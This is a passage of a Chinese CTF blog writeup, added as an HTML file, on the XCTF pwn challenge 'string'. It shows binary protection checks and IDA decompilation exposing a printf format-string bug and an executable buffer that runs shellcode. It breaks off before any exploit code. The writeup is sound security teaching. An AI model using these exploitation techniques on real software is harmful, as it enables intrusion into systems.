@@ -1,0 +1,3580 @@
+<!DOCTYPE html>
+<html lang="">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="MUZIBing">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="MUZIBing">
+    
+    <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content>
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <title>【XCTF-pwn】由浅入深的剖析 &#34;string&#34; 题目 · MUZIBing&#39;s BLOG</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="stylesheet" href="/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href="/assets/favicon.jpg">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+        <!-- algolia -->
+        <script>
+            
+            var hits = JSON.parse('{"per_page":10}')
+            var labels = JSON.parse('{"input_placeholder":"Search for Posts","hits_empty":"We did not find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}')
+
+            var algolia = {
+                applicationID: 'BN8DBA0DBN',
+                apiKey: '743de843b152b923f8db5d51eac38a27',
+                indexName: 'search',
+                hits: hits,
+                labels: labels
+            }
+        </script>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  --><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<!-- hexo-inject:begin --><!-- hexo-inject:end --><header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/">MUZIBing&#39;s BLOG</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">【XCTF-pwn】由浅入深的剖析 "string" 题目</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href="/">MUZIBing's BLOG</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/120.png)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            【XCTF-pwn】由浅入深的剖析 "string" 题目
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class="post-intro-tags">
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="XCTF">XCTF</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="pwn">pwn</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">4.6k</span>阅读时长: <span class="post-count reading-time">21 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2020/05/30</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a><font color="navy"><code>0x00 前言</code></font></h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在上一篇“<a href="https://muzibing.github.io/2020/05/29/2020.05.29%EF%BC%88119%EF%BC%89">详解格式化字符串漏洞</a>”中已经很详细的阐述格式化字符串漏洞的原理以及如何构造payload，并且用例子进一步的说明了格式化字符串漏洞的危害，今天我们就以XCTF中的<code>string</code>题目为例，再次感受一下格式化字符串漏洞的实际危害。在写这篇文章之前，我已经在网上查了相关的writeup，虽然很多人将这道题目解了出来，并写了相关的writeup发在网上，但是我在看这些文章时，发现这些文章中存在着很多问题以及表述不正确的地方，今天我准备系统的写一下这道题目的writeup，具体的细节就不会一一赘述，如果想了解格式化字符串更多细节，请阅读“<a href="https://muzibing.github.io/2020/05/29/2020.05.29%EF%BC%88119%EF%BC%89">详解格式化字符串漏洞</a>”。</p>
+<h3 id="0x01-题目分析"><a href="#0x01-题目分析" class="headerlink" title="0x01 题目分析"></a><font color="navy"><code>0x01 题目分析</code></font></h3><h4 id="1-查看-ELF-文件"><a href="#1-查看-ELF-文件" class="headerlink" title="1.查看 ELF 文件"></a><code>1.查看 ELF 文件</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># file pwn</span><br><span class="line">pwn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=4f9fd3e83d275c6555ec7059823616ffc2f1af1b, stripped</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>从上述信息可以看出<code>pwn</code>是一个x86-64位的ELF文件</p>
+</blockquote>
+<h4 id="2-查看文件保护机制"><a href="#2-查看文件保护机制" class="headerlink" title="2.查看文件保护机制"></a><code>2.查看文件保护机制</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># checksec pwn</span><br><span class="line">[*] &apos;/root/Documents/CTF/PWN/XCTF/pwn/1/string/pwn&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>从上述信息中可以看出：</p>
+<ul>
+<li><code>pwn</code>文件的结构<code>amd64-64-little</code>，</li>
+<li>GOT表不可写</li>
+<li>有金丝雀，开启了栈保护，因此无法用实现栈溢出</li>
+<li>栈不可执行</li>
+<li>没有开启地址随机化</li>
+</ul>
+</blockquote>
+<h4 id="3-用-IDA-逆向"><a href="#3-用-IDA-逆向" class="headerlink" title="3.用 IDA 逆向"></a><code>3.用 IDA 逆向</code></h4><blockquote>
+<p>下面我将 IDA 逆向的结果放在一起：</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br></pre></td><td class="code"><pre><span class="line">// main函数</span><br><span class="line">// 内部含有的函数：sub_400D72(v5);</span><br><span class="line">// 功能：打印v5的地址</span><br><span class="line"></span><br><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; // ST88_8@1</span><br><span class="line">  _DWORD *v4; // rax@1</span><br><span class="line">  __int64 v5; // ST18_8@1</span><br><span class="line">  __int64 result; // rax@1</span><br><span class="line">  __int64 v7; // rdx@1</span><br><span class="line"></span><br><span class="line">  v3 = *MK_FP(__FS__, 40LL);</span><br><span class="line">  setbuf(stdout, 0LL);</span><br><span class="line">  alarm(0x3Cu);</span><br><span class="line">  sub_400996(60LL, 0LL);</span><br><span class="line">  v4 = malloc(8uLL);</span><br><span class="line">  v5 = (__int64)v4;</span><br><span class="line">  *v4 = 68;</span><br><span class="line">  v4[1] = 85;</span><br><span class="line">  puts(&quot;we are wizard, we will give you hand, you can not defeat dragon by yourself ...&quot;);</span><br><span class="line">  puts(&quot;we will tell you two secret ...&quot;);</span><br><span class="line">  printf(&quot;secret[0] is %x\n&quot;, v5, a2);</span><br><span class="line">  printf(&quot;secret[1] is %x\n&quot;, v5 + 4);</span><br><span class="line">  puts(&quot;do not tell anyone &quot;);</span><br><span class="line">  sub_400D72(v5);</span><br><span class="line">  puts(&quot;The End.....Really?&quot;);</span><br><span class="line">  result = 0LL;</span><br><span class="line">  v7 = *MK_FP(__FS__, 40LL) ^ v3;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br><span class="line">////////////////////////////////////////////////////////////////////////////////////////////////////////////</span><br><span class="line"></span><br><span class="line">// sub_400D72(v5);</span><br><span class="line">// 内部含有的函数：sub_400A7D(&quot;Creating a new player.&quot;);sub_400BB9();sub_400CA6(a1);</span><br><span class="line">// 功能：创建角色名称，长度不能超过13</span><br><span class="line"></span><br><span class="line">__int64 __fastcall sub_400D72(__int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  char s; // [sp+10h] [bp-20h]@1</span><br><span class="line">  __int64 v3; // [sp+28h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v3 = *MK_FP(__FS__, 40LL);</span><br><span class="line">  puts(&quot;What should your character&apos;s name be:&quot;);</span><br><span class="line">  _isoc99_scanf(&quot;%s&quot;, &amp;s);</span><br><span class="line">  if ( strlen(&amp;s) &lt;= 0xC )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Creating a new player.&quot;);</span><br><span class="line">    sub_400A7D();</span><br><span class="line">    sub_400BB9();</span><br><span class="line">    sub_400CA6(a1);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Hei! What&apos;s up!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return *MK_FP(__FS__, 40LL) ^ v3;</span><br><span class="line">&#125;</span><br><span class="line">////////////////////////////////////////////////////////////////////////////////////////////////////////////</span><br><span class="line"></span><br><span class="line">// sub_400A7D();</span><br><span class="line">// 内部包含的函数：sub_4009DD(&amp;s1, &quot;up&quot;);</span><br><span class="line">// 功能：要求输入“east”才可进行下一步</span><br><span class="line"></span><br><span class="line">__int64 sub_400A7D()</span><br><span class="line">&#123;</span><br><span class="line">  char s1; // [sp+0h] [bp-10h]@2</span><br><span class="line">  __int64 v2; // [sp+8h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v2 = *MK_FP(__FS__, 40LL);</span><br><span class="line">  puts(&quot; This is a famous but quite unusual inn. The air is fresh and the&quot;);</span><br><span class="line">  puts(&quot;marble-tiled ground is clean. Few rowdy guests can be seen, and the&quot;);</span><br><span class="line">  puts(&quot;furniture looks undamaged by brawls, which are very common in other pubs&quot;);</span><br><span class="line">  puts(&quot;all around the world. The decoration looks extremely valuable and would fit&quot;);</span><br><span class="line">  puts(&quot;into a palace, but in this city it&apos;s quite ordinary. In the middle of the&quot;);</span><br><span class="line">  puts(&quot;room are velvet covered chairs and benches, which surround large oaken&quot;);</span><br><span class="line">  puts(&quot;tables. A large sign is fixed to the northern wall behind a wooden bar. In&quot;);</span><br><span class="line">  puts(&quot;one corner you notice a fireplace.&quot;);</span><br><span class="line">  puts(&quot;There are two obvious exits: east, up.&quot;);</span><br><span class="line">  puts(&quot;But strange thing is ,no one there.&quot;);</span><br><span class="line">  puts(&quot;So, where you will go?east or up?:&quot;);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    _isoc99_scanf(&quot;%s&quot;, &amp;s1);</span><br><span class="line">    if ( !strcmp(&amp;s1, &quot;east&quot;) || !strcmp(&amp;s1, &quot;east&quot;) )</span><br><span class="line">      break;</span><br><span class="line">    puts(&quot;hei! I&apos;m secious!&quot;);</span><br><span class="line">    puts(&quot;So, where you will go?:&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  if ( strcmp(&amp;s1, &quot;east&quot;) )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( !strcmp(&amp;s1, &quot;up&quot;) )</span><br><span class="line">      sub_4009DD(&amp;s1, &quot;up&quot;);</span><br><span class="line">    puts(&quot;YOU KNOW WHAT YOU DO?&quot;);</span><br><span class="line">    exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  return *MK_FP(__FS__, 40LL) ^ v2;</span><br><span class="line">&#125;</span><br><span class="line">////////////////////////////////////////////////////////////////////////////////////////////////////////////</span><br><span class="line"></span><br><span class="line">// sub_4009DD();</span><br><span class="line">// 内部包含的函数：*</span><br><span class="line">// </span><br><span class="line"></span><br><span class="line">void __noreturn sub_4009DD()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v0; // eax@1</span><br><span class="line">  int v1; // eax@2</span><br><span class="line">  int v2; // [sp+0h] [bp-10h]@2</span><br><span class="line">  unsigned int v3; // [sp+4h] [bp-Ch]@2</span><br><span class="line">  __int64 v4; // [sp+8h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v4 = *MK_FP(__FS__, 40LL);</span><br><span class="line">  puts(&quot;You go right, suddenly, a big hole appear front you!&quot;);</span><br><span class="line">  puts(&quot;where you will go?!left(0) or right(1)?!:&quot;);</span><br><span class="line">  v0 = time(0LL);</span><br><span class="line">  srand(v0);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = rand();</span><br><span class="line">    v3 = ((((unsigned int)v1 &gt;&gt; 31) + (_BYTE)v1) &amp; 1) - ((unsigned int)v1 &gt;&gt; 31);</span><br><span class="line">    _isoc99_scanf(&quot;%d&quot;, &amp;v2);</span><br><span class="line">    if ( v2 != v3 )</span><br><span class="line">      break;</span><br><span class="line">    puts(&quot;You escape it!but another hole appear!&quot;);</span><br><span class="line">    puts(&quot;where you will go?!left(0) or right(1)?!:&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;YOU ARE DEAD&quot;);</span><br><span class="line">  exit(0);</span><br><span class="line">&#125;</span><br><span class="line">////////////////////////////////////////////////////////////////////////////////////////////////////////////</span><br><span class="line"></span><br><span class="line">// sub_400BB9();</span><br><span class="line">// 内部包含的函数：*</span><br><span class="line">// 功能：输入一个地址、wish（存在格式化漏洞）</span><br><span class="line"></span><br><span class="line">__int64 sub_400BB9()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [sp+4h] [bp-7Ch]@1</span><br><span class="line">  __int64 v2; // [sp+8h] [bp-78h]@1</span><br><span class="line">  char format; // [sp+10h] [bp-70h]@2</span><br><span class="line">  __int64 v4; // [sp+78h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v4 = *MK_FP(__FS__, 40LL);</span><br><span class="line">  v2 = 0LL;</span><br><span class="line">  puts(&quot;You travel a short distance east.That&apos;s odd, anyone disappear suddenly&quot;);</span><br><span class="line">  puts(&quot;, what happend?! You just travel , and find another hole&quot;);</span><br><span class="line">  puts(&quot;You recall, a big black hole will suckk you into it! Know what should you do?&quot;);</span><br><span class="line">  puts(&quot;go into there(1), or leave(0)?:&quot;);</span><br><span class="line">  _isoc99_scanf(&quot;%d&quot;, &amp;v1);</span><br><span class="line">  if ( v1 == 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;A voice heard in your mind&quot;);</span><br><span class="line">    puts(&quot;&apos;Give me an address&apos;&quot;);</span><br><span class="line">    _isoc99_scanf(&quot;%ld&quot;, &amp;v2);</span><br><span class="line">    puts(&quot;And, you wish is:&quot;);</span><br><span class="line">    _isoc99_scanf(&quot;%s&quot;, &amp;format);</span><br><span class="line">    puts(&quot;Your wish is&quot;);</span><br><span class="line">    printf(&amp;format, &amp;format);</span><br><span class="line">    puts(&quot;I hear it, I hear it....&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return *MK_FP(__FS__, 40LL) ^ v4;</span><br><span class="line">&#125;</span><br><span class="line">////////////////////////////////////////////////////////////////////////////////////////////////////////////</span><br><span class="line"></span><br><span class="line">// sub_400CA6(a1);</span><br><span class="line">// 内部包含的函数：mmap(0LL, 0x1000uLL, 7, 33, -1, 0LL);</span><br><span class="line">// 功能：当满足*(_DWORD *)a1 == *(_DWORD *)(a1 + 4) 条件的时候，可以直接输入shellcode，执行我们需要的代码</span><br><span class="line"></span><br><span class="line">__int64 __fastcall sub_400CA6(__int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  void *v1; // rsi@2</span><br><span class="line">  __int64 v3; // [sp+18h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v3 = *MK_FP(__FS__, 40LL);</span><br><span class="line">  puts(&quot;Ahu!!!!!!!!!!!!!!!!A Dragon has appeared!!&quot;);</span><br><span class="line">  puts(&quot;Dragon say: HaHa! you were supposed to have a normal&quot;);</span><br><span class="line">  puts(&quot;RPG game, but I have changed it! you have no weapon and &quot;);</span><br><span class="line">  puts(&quot;skill! you could not defeat me !&quot;);</span><br><span class="line">  puts(&quot;That&apos;s sound terrible! you meet final boss!but you level is ONE!&quot;);</span><br><span class="line">  if ( *(_DWORD *)a1 == *(_DWORD *)(a1 + 4) )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Wizard: I will help you! USE YOU SPELL&quot;);</span><br><span class="line">    v1 = mmap(0LL, 0x1000uLL, 7, 33, -1, 0LL);</span><br><span class="line">    read(0, v1, 0x100uLL);</span><br><span class="line">    ((void (__fastcall *)(_QWORD, void *))v1)(0LL, v1);</span><br><span class="line">  